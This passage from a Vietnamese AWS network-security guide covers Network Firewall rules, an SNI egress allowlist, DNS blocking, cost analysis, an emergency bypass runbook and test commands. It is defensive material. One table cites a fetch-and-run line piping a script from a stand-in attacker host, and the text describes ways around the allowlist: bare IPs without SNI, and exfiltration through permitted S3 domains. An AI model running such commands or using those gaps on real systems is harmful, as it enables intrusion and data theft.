        # CHAN tuyet doi: nonprod khong duoc cham vao prod
        drop ip 10.10.0.0/16 any -> 10.20.0.0/16 any (msg:"BLOCK dev to app-prod"; sid:1010; rev:1;)
        drop ip 10.10.0.0/16 any -> 10.30.0.0/16 any (msg:"BLOCK dev to data-prod"; sid:1011; rev:1;)

        # Ghi log moi luong noi bo con lai
        alert ip 10.0.0.0/8 any -> 10.0.0.0/8 any (msg:"UNMATCHED east-west"; sid:1999; rev:1;)
      EOT
    }
  }
}
```

Rule `sid:1999` rất đáng giá lúc mới triển khai: nó ghi log mọi luồng nội bộ chưa khai báo. Đọc log này vài tuần là có bản đồ thật về ai đang gọi ai — thường khác xa sơ đồ trên giấy.

### 7.2. Egress domain allowlist

```hcl
resource "aws_networkfirewall_rule_group" "egress_domains" {
  provider = aws.network
  capacity = 500
  name     = "${var.project}-egress-domains"
  type     = "STATEFUL"

  rule_group {
    rule_variables {
      ip_sets {
        key = "HOME_NET"
        ip_set {
          definition = ["10.0.0.0/8"]
        }
      }
    }

    rules_source {
      rules_source_list {
        generated_rules_type = "ALLOWLIST"
        target_types         = ["TLS_SNI", "HTTP_HOST"]

        targets = [
          ".amazonaws.com",
          ".amazontrust.com",
          ".amazonlinux.com",
          ".ubuntu.com",
          ".debian.org",
          ".pypi.org",
          ".pythonhosted.org",
          ".npmjs.org",
          ".docker.io",
          ".docker.com",
          ".github.com",
          ".githubusercontent.com",
          # Doi tac - xem doc 16
          "api.partner-a.com",
        ]
      }
    }
  }
}
```

Allowlist chỉ dựa vào **SNI** vì Network Firewall không giải mã TLS. Kẻ tấn công có thể lách bằng cách gọi thẳng IP không kèm SNI — nên cần rule stateless chặn traffic ra Internet ngoài 443/80, buộc mọi thứ đi qua đường có SNI kiểm tra được.

### 7.3. Stateless – chặn DNS đi thẳng

```hcl
resource "aws_networkfirewall_rule_group" "stateless_drop" {
  provider = aws.network
  capacity = 100
  name     = "${var.project}-stateless-drop"
  type     = "STATELESS"

  rule_group {
    rules_source {
      stateless_rules_and_custom_actions {
        stateless_rule {
          priority = 10
          rule_definition {
            actions = ["aws:drop"]
            match_attributes {
              protocols = [17] # UDP
              source {
                address_definition = "10.0.0.0/8"
              }
              destination {
                address_definition = "0.0.0.0/0"
              }
              destination_port {
                from_port = 53
                to_port   = 53
              }
            }
          }
        }
      }
    }
  }
}
```

Buộc mọi truy vấn tên đi qua Route 53 Resolver, nơi đã có DNS Firewall và query logging ([doc 12](./12-DNS-va-VPC-Endpoint-Tap-Trung-AWS-Only.md)). Đây là lớp chống exfil qua DNS.

### 7.4. Logging về log-archive

```hcl
resource "aws_networkfirewall_logging_configuration" "main" {
  provider     = aws.network
  firewall_arn = aws_networkfirewall_firewall.main.arn

  logging_configuration {
    log_destination_config {
      log_type             = "ALERT"
      log_destination_type = "S3"
      log_destination = {
        bucketName = var.firewall_log_bucket # o log-archive account
        prefix     = "network-firewall/alert"
      }
    }

    log_destination_config {
      log_type             = "FLOW"
      log_destination_type = "S3"
      log_destination = {
        bucketName = var.firewall_log_bucket
        prefix     = "network-firewall/flow"
      }
    }
  }
}
```

ALERT ghi những gì bị chặn hoặc khớp rule `alert`. FLOW ghi **mọi** luồng — rất giá trị nhưng tốn dung lượng. Đặt lifecycle S3 chuyển Glacier sau 30 ngày.

---

### 7.5. Chặn được gì, và không chặn được gì

Nửa sau của bảng này quan trọng hơn nửa đầu.

#### Chặn được

| Mối nguy | Bằng cách nào |
|---|---|
| **Lateral movement giữa các VPC** | `drop` + danh sách rule tường minh. Spoke bị chiếm không với sang spoke khác nếu không có rule |
| **Port scan nội bộ** | Chặn, và catch-all `alert` ghi lại toàn bộ |
| **Exfil ra domain lạ** | Allowlist SNI/Host — `curl attacker.com \| sh` chết ngay |
| **Đội workload tự nới security group** | SG mở port 22 mà firewall vẫn chặn. Hai chủ sở hữu, không bên nào một mình mở được đường |
| **Malware C2 tới domain/IP đã biết** | Cần **managed rule group** (xem §7 phần đầu) — code mẫu có, demo chưa bật cái nào |

Dòng thứ tư mới là điểm kiến trúc. SG do **đội workload** sửa, firewall do **đội network** sửa, và route `0.0.0.0/0 → security VPC` nằm trong TGW của account network nên không account nào tự bỏ qua được.

#### Không chặn được

| Mối nguy | Thứ đúng để dùng |
|---|---|
| **SQLi, XSS, path traversal** | AWS WAF ở CloudFront/ALB — [doc 14](./14-Ingress-Chain-CDN-PaloAlto-F5-WAF.md) |
| **Payload xấu bên trong TLS** | Bật **TLS inspection** (cần ACM cert + CA nội bộ), hoặc appliance L7 |
| **Exfil qua domain ĐƯỢC PHÉP** | VPC endpoint policy + điều kiện `aws:PrincipalOrgID` |
| **Lạm dụng credential qua AWS API** | IAM/SCP + CloudTrail + GuardDuty — [doc 23](./23-Lop-Phat-Hien-GuardDuty-SecurityHub-Log-Archive.md) |
| **Traffic trong CÙNG một VPC** | Security group. Luồng đó không qua TGW nên không bao giờ tới firewall |
| **DDoS L3/L4** | AWS Shield |
| **DNS tunneling** | **Route 53 Resolver DNS Firewall** |

**Dòng "exfil qua domain được phép" là lỗ hổng thật của thiết kế này**, và nó không hiển nhiên. Allowlist domain nghe như đã khoá chặt, nhưng `.amazonaws.com` nằm trong danh sách mở toang cho **mọi bucket S3 trên thế giới** — kể cả bucket của kẻ tấn công. Firewall thấy SNI hợp lệ và cho qua. Chặn nó là việc của endpoint policy, không phải của firewall.

#### Hai lớp nên thêm

**1. Managed rule group.** AWS có sẵn bộ chữ ký cập nhật liên tục — botnet C2, malware domain, IP có tiếng xấu. Thêm ở ưu tiên sau allowlist domain (§7 phần đầu có mẫu). Cột `Managed` trong console hiện là `No` cho cả ba group: chưa có bộ tình báo mối đe doạ nào đang chạy.

**2. Route 53 Resolver DNS Firewall.** Chặn ở tầng **truy vấn DNS**, trước cả khi có gói tin. Với [DNS tập trung qua Route 53 Profile](./12-DNS-va-VPC-Endpoint-Tap-Trung-AWS-Only.md) thì nó gắn vào rất tự nhiên, và bắt được thứ Network Firewall không thấy: DNS tunneling, và tên miền độc hại mà máy chưa kịp kết nối tới.

Hai lớp bổ sung nhau: DNS Firewall nói *"đừng hỏi địa chỉ đó"*, Network Firewall nói *"đừng gửi gói tin tới đó"*.

#### Điều kiện để mọi dòng ✅ ở trên có nghĩa

Ở `firewall_mode = "alert"` thì **không dòng nào đúng cả** — firewall chỉ ghi log, mặc định vẫn cho qua. Mọi thứ trong bảng đầu chỉ thành sự thật sau khi chuyển `drop`, và trước khi chuyển thì phải tắt rule mesh (nếu có) rồi đọc log catch-all đủ lâu. Xem [mục 12](#12-lộ-trình--tuyệt-đối-không-bật-chặn-ngay).

---

## 8. Chi phí – đọc trước khi cam kết

| Thành phần | Đơn giá | Tháng (2 AZ) |
|---|---|---|
| **Network Firewall endpoint** | ~$0.395/giờ/AZ | **~$576** |
| **Network Firewall data** | ~$0.065/GB | theo lưu lượng |
| TGW attachment (security) | ~$0.05/giờ | ~$36.50 |
| TGW data processing | ~$0.02/GB | **× 4 lần** |
| NAT (ở egress VPC) | ~$0.045/giờ + $0.045/GB | ~$66 + traffic |

### 8.0. Chỉ có hai chiều tính tiền

Network Firewall tính tiền theo **đúng hai** thứ:

```
chi phí = (số AZ × $0.395/giờ)  +  (số GB firewall xử lý × $0.065)
              ↑ endpoint                    ↑ dữ liệu
```

Chiều thứ nhất là **cố định**, trả kể cả khi không một gói tin nào đi qua. Chiều thứ hai đếm **cả request lẫn response** — một vòng đi-về 1 GB là 2 GB được xử lý.

#### Những thứ KHÔNG tính tiền

Đây là chỗ nhiều người ước lượng sai theo hướng ngược lại — sợ tốn nên để chật, rồi mắc kẹt:

| Thứ | Phí |
|---|---|
| **Capacity** của rule group | **$0** — giữ trước 1000 hay 100 đều như nhau. Và nó **bất biến**, sửa là tạo lại resource, nên để rộng ngay từ đầu |
| Số **rule** trong một group | $0 |
| Số **rule group** trong policy | $0 |
| **Managed rule group** của AWS | $0 thêm — bộ chữ ký botnet/malware không tính phí riêng |
| Bản thân **firewall policy** | $0 |
| Toàn bộ [lớp vận hành `ops/`](./25-Van-hanh-Network-Hang-Ngay.md) | $0 — nó chỉ sinh rule; chỉ `endpoints.yaml` mới tốn tiền |

Nghĩa là: **thêm rule không làm hoá đơn tăng.** Thứ làm hoá đơn tăng là thêm AZ, và lượng dữ liệu chảy qua.

#### Khoản dễ quên: log

FLOW log ghi **mọi phiên**, không chỉ phiên bị chặn. Ở môi trường bận, đó là hàng chục GB mỗi ngày đổ vào S3 — tính phí PUT request và lưu trữ, tách khỏi giá firewall ở trên.

ALERT log thì nhỏ hơn nhiều. Bật cả hai ở giai đoạn lập bản đồ, rồi cân nhắc chỉ giữ ALERT — xem [mục 8.2](#82-ba-cách-giảm-mà-không-mất-khả-năng-kiểm-soát).

### 8.1. Cái giá của việc tách VPC

Vì security VPC tách khỏi egress VPC, một vòng đi-về của gói tin qua TGW **bốn lần**:

```text
spoke → security  (1)
security → egress (2)
egress → security (3)   [chiều về]
security → spoke  (4)
```

Với 10 TB/tháng:

| | Tách VPC (thiết kế này) | Gộp firewall vào egress VPC |
|---|---|---|
| Firewall endpoint | $576 | $576 |
| Firewall data (10 TB) | $650 | $650 |
| **TGW data** | **$800** (4 lần) | **$400** (2 lần) |
| NAT data | $450 | $450 |
| Cố định (attachment, NAT) | $102 | $66 |
| **Cộng** | **~$2.578** | **~$2.142** |

Chênh lệch ~**$436/tháng** ở mức 10 TB. Đây là cái giá của ranh giới rõ ràng — thay firewall, đổi vendor, hay giao security VPC cho đội security quản mà không đụng tới đường egress. Với tổ chức có đội security tách biệt, đây thường là khoản đáng chi.

### 8.2. Ba cách giảm mà không mất khả năng kiểm soát

1. **VPC endpoint cho service AWS** ([doc 12](./12-DNS-va-VPC-Endpoint-Tap-Trung-AWS-Only.md)) — quan trọng nhất. Traffic tới S3/DynamoDB qua gateway endpoint **miễn phí**, không qua firewall, không qua TGW. Ở đa số môi trường đây là phần lớn nhất của lưu lượng egress.

   > Không có VPC endpoint nghĩa là bạn đang trả $0.065/GB cho firewall cộng $0.08/GB cho TGW để thanh tra traffic đi tới chính AWS — thứ mà endpoint policy với `aws:PrincipalOrgID` kiểm soát tốt hơn và miễn phí.

2. **FLOW log có chọn lọc.** Bật giai đoạn đầu để lập bản đồ luồng, sau đó cân nhắc chỉ giữ ALERT.

3. **Xem lại phạm vi east-west.** Nếu chỉ vài cặp spoke cần nói chuyện, PrivateLink giữa đúng cặp đó rẻ hơn nhiều so với đẩy toàn bộ qua firewall.

### 8.3. Bộ đang chạy — tính từng khoản

`landing-zone/network` với 5 spoke (1 local + 4 ở account khác), 2 AZ, firewall bật, ingress bật, 3 interface endpoint. `terraform output estimated_cost` cho **~$1.397/giờ**. Nó ra từ đâu:

| Khoản | Cách tính | USD/giờ |
|---|---|---|
| **Firewall endpoint** | 2 AZ × $0.395 | **0.790** |
| TGW attachment | 8 × $0.05 — 5 spoke + egress + security + ingress | 0.400 |
| NAT Gateway | 2 AZ × $0.045 | 0.090 |
| Interface endpoint | 2 AZ × 3 dịch vụ × $0.01 | 0.060 |
| NLB | 2 AZ × $0.0225 | 0.045 |
| EC2 kiểm chứng | 1 × t3.micro | 0.012 |
| | **Cộng** | **~1.397** |

≈ **$33.52/ngày**, ≈ **$1.020/tháng** — chưa tính data transfer.

Ba điều đọc ra từ bảng này:

**Firewall chiếm 57%.** Và nó nhân theo **số AZ**, không theo lưu lượng hay số spoke. Chạy 3 AZ là $1.185/giờ chỉ riêng endpoint. Đây là lý do demo mặc định 2 AZ — nhưng cũng là lý do 2 AZ là **tối thiểu** cho môi trường thật: một AZ thì subnet ở AZ đó mất mạng khi endpoint hỏng, và `appliance_mode_support` chưa từng được kiểm chứng ([mục 4](#4-appliance_mode_support--thiết-lập-quan-trọng-nhất)).

**Attachment đứng thứ hai, và nó tăng theo số VPC.** Mỗi spoke mới là $0.05/giờ = $36.50/tháng, trước khi có một gói tin nào. Spoke chỉ để thử thì xoá sau khi thử xong.

**Bốn spoke ở account khác không đắt hơn spoke local.** Attachment tính như nhau bất kể VPC nằm ở account nào — cross-account không phải khoản phụ thu.

#### Muốn rẻ đi ngay

| Đổi | Tiết kiệm | Mất gì |
|---|---|---|
| `enable_firewall = false` | **−$0.79/giờ** (57%) | Không còn east-west inspection. Vẫn kiểm chứng được egress tập trung, cách ly spoke, ingress |
| `enable_ingress = false` | −$0.095/giờ | Không có NLB và attachment ingress |
| `enable_interface_endpoints = false` | −$0.06/giờ | SSM đi vòng ra Internet qua NAT — **tốn phí NAT thay vào** |
| Bớt spoke thử nghiệm | −$0.05/giờ mỗi cái | |

Dòng thứ ba là bẫy: tắt interface endpoint **không** luôn rẻ hơn. $0.06/giờ cố định đổi lấy $0.045/GB phí NAT cộng $0.065/GB phí firewall cho lưu lượng SSM. Với vài chục instance gọi SSM liên tục thì endpoint rẻ hơn; với một demo bốn tiếng thì không. Và khi lý do là **bảo mật** — không cho lưu lượng tới AWS API đi ra Internet — thì phép so tiền không phải là phép so đúng.

---

## 9. Firewall chết thì sao

Phải trả lời **trước khi** triển khai, không phải lúc sự cố.

| Tình huống | Hệ quả | Chuẩn bị |
|---|---|---|
| Một endpoint (một AZ) hỏng | Traffic AZ đó gãy | Endpoint ở mọi AZ; alarm theo AZ |
| Policy sai chặn nhầm | Ứng dụng lỗi hàng loạt | Mục 11 — luôn `alert` trước |
| Cả firewall hỏng | **Toàn bộ LZ mất mạng**, cả east-west | Runbook bypass đã diễn tập |

AWS Network Firewall **không có chế độ fail-open**. Endpoint không khả dụng thì route trỏ vào nó sẽ đen. Nghĩa là:

> Security VPC là điểm chết đơn lẻ của **toàn bộ** hạ tầng mạng — không chỉ đường ra Internet mà cả luồng giữa các account.

Runbook bypass khẩn cấp. Điểm thuận lợi của việc tách VPC: bypass chỉ là đổi **TGW route table**, không đụng gì bên trong VPC:

```bash
#!/usr/bin/env bash
# BYPASS KHAN CAP - chi chay khi da xac dinh firewall la nguyen nhan.
# Tro rtb-spokes thang sang egress VPC, bo qua security VPC.
set -euo pipefail

REGION=ap-southeast-1
RTB_SPOKES=$(aws ec2 describe-transit-gateway-route-tables --region $REGION \
  --filters "Name=tag:Name,Values=acme-rtb-spokes" \
  --query 'TransitGatewayRouteTables[0].TransitGatewayRouteTableId' --output text)

ATT_EGRESS=$(aws ec2 describe-transit-gateway-attachments --region $REGION \
  --filters "Name=tag:Name,Values=acme-tgwa-egress" \
  --query 'TransitGatewayAttachments[0].TransitGatewayAttachmentId' --output text)

aws ec2 replace-transit-gateway-route --region $REGION \
  --transit-gateway-route-table-id "$RTB_SPOKES" \
  --destination-cidr-block 0.0.0.0/0 \
  --transit-gateway-attachment-id "$ATT_EGRESS"

echo "BYPASSED. Dang chay KHONG co thanh tra."
echo "Mo su co P1 ngay va khoi phuc sau khi xu ly xong."
```

Lưu ý: bypass này khôi phục **egress**, nhưng **east-west vẫn chết** vì `rtb-spokes` giờ chỉ có đường ra egress VPC. Muốn khôi phục cả east-west thì phải propagate spoke vào `rtb-spokes` — cần script riêng, và đó là một quyết định lớn hơn nữa.

Chạy script này là **quyết định có ý thức đánh đổi bảo mật lấy khả dụng**. Quy định rõ ai được quyền quyết định, và bắt buộc mở sự cố để không ai quên khôi phục.

---

## 10. Kiểm tra

```bash
# === Tu EC2 trong spoke ===

# 1. Egress cho phep (domain trong allowlist)
curl -sI https://www.amazonaws.com | head -1

# 2. Egress bi chan (ngoai allowlist) -> phai fail
curl -sm 5 https://example.com ; echo "exit=$?"

# 3. East-west cho phep (app-prod -> data-prod:5432)
nc -zv 10.30.1.20 5432

# 4. East-west bi chan (app-prod -> data-prod:22) -> phai timeout
nc -zvw 5 10.30.1.20 22

# 5. DNS di thang ra Internet -> bi chan boi stateless rule
dig @8.8.8.8 example.com ; echo "exit=$?"

# === Phia firewall ===

# 6. Trang thai endpoint tung AZ
aws network-firewall describe-firewall --firewall-name acme-fw \
  --query 'FirewallStatus.SyncStates' --output json

# 7. Alert log
aws s3 ls s3://acme-fw-logs-222222222222/network-firewall/alert/ --recursive | tail -5

# 8. Kiem tra doi xung: TGW route table phai tro dung
aws ec2 search-transit-gateway-routes \
  --transit-gateway-route-table-id "$RTB_EGRESS" \
  --filters "Name=state,Values=active" \
  --query 'Routes[].{cidr:DestinationCidrBlock,att:TransitGatewayAttachments[0].TransitGatewayAttachmentId}'
# spoke_supernet PHAI tro ve security attachment, khong phai spoke

# 9. Appliance mode - dua vao pipeline kiem tra sau moi lan apply
aws ec2 describe-transit-gateway-vpc-attachments \
  --filters "Name=vpc-id,Values=$SECURITY_VPC_ID" \
  --query 'TransitGatewayVpcAttachments[].Options.ApplianceModeSupport' --output text
# => enable
```

Lệnh 8 và 9 là hai kiểm tra quan trọng nhất — cả hai đều bắt lỗi âm thầm, chỉ lộ ra khi có luồng thật.

---

## 11. Bẫy hay gặp

| Triệu chứng | Nguyên nhân |
|---|---|
| East-west chập chờn theo AZ | Chưa bật `appliance_mode_support` |
| Egress ra được nhưng không nhận trả lời | `rtb-egress` propagate từ spoke thay vì route tĩnh về security |
| Firewall không thấy log gì | Route của tgw subnet chưa trỏ vào firewall endpoint |
| Chặn nhầm hàng loạt lúc go-live | Bật `drop_established` ngay thay vì `alert` trước |
| Domain allowlist không ăn | Client không gửi SNI, hoặc gọi thẳng IP |
| Chi phí gấp đôi dự tính | Traffic tới AWS service chưa đi qua VPC endpoint |
| Route trỏ sai endpoint | `local.fw_endpoints` map theo AZ — kiểm tra khớp AZ |
| Không xoá được firewall | `delete_protection = true` (đúng thiết kế) |
| Rule không theo thứ tự | Thiếu `rule_order = "STRICT_ORDER"` ở **cả** policy lẫn rule group |
| Vòng lặp route | firewall subnet trỏ `0/0 → TGW` mà TGW lại trỏ về security — kiểm tra `rtb-security` có `0/0 → egress` |
| **Request vào tới app nhưng client không nhận phản hồi** | `rtb-security` thiếu route tĩnh `ingress_vpc_cidr → ingress`; gói trả lời khớp `0/0` và bị đẩy sang egress VPC |
| Thêm VPC mới thì luồng tới nó gãy | Mỗi VPC mới trong network account cần một route tĩnh trong `rtb-security` (mục 6) |

---

## 12. Lộ trình – tuyệt đối không bật chặn ngay

```text
Tuan 1-2  Dung security VPC, firewall, TGW route
          Policy: MOI THU deu 'alert', KHONG drop
          stateful_default_actions = ["aws:alert_established"]
          -> Ung dung chay binh thuong, chi ghi log

Tuan 3-4  Bat FLOW log, dung Athena
          Lap ban do that: ai goi ai, goi cai gi
          -> Gan nhu chac chan phat hien luong khong ai biet la co

Tuan 5-6  Viet rule allow cho cac luong hop le da phat hien
          Van giu default = alert
          Theo doi rule 'UNMATCHED' con khop bao nhieu

Tuan 7    Chuyen default sang drop o OU Sandbox truoc

Tuan 9    Mo rong NonProd

Tuan 11   Mo rong Prod, ngoai gio cao diem, co nguoi truc
          Runbook bypass san sang, da dien tap
```

Giai đoạn tuần 3-4 mới là giá trị thật của dự án này, kể cả khi bạn chưa bao giờ bật chế độ chặn. Hầu hết tổ chức không có bản đồ chính xác về luồng mạng nội bộ của mình, và FLOW log trả lời câu hỏi đó bằng dữ liệu thay vì phỏng đoán.

Bật `drop` ngay tuần đầu là cách nhanh nhất để cả công ty mất niềm tin vào đội platform — và sau đó bạn sẽ không được phép làm gì tương tự trong một thời gian dài.
